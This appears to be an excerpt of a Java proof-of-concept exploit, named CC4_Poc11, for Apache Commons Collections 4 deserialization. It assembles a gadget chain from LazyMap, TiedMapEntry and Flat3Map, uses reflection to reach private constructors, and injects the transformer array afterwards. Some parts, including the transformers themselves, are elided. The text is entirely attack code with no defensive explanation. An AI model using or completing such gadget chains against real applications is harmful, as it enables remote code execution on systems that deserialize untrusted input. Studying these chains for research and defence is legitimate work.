 ...
 * get:165, LazyMap (org.apache.commons.collections4.map)
...
public class CC4_Poc11 {
    public static void main(String[] args) throws Exception {
        ...
        Class clazz3 = Class.forName("org.apache.commons.collections4.map.LazyMap");
        Constructor lazymap = clazz3.getDeclaredConstructor(Map.class,Transformer.class);
        lazymap.setAccessible(true);
        Object outerMap = lazymap.newInstance(innermap,transformerChain);
        TiedMapEntry tiedmap = new TiedMapEntry((LazyMap) outerMap,123);
        Flat3Map flat3Map = new Flat3Map((LazyMap) outerMap);
        flat3Map.put(tiedmap,"1");
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        ((LazyMap) outerMap).remove(123);
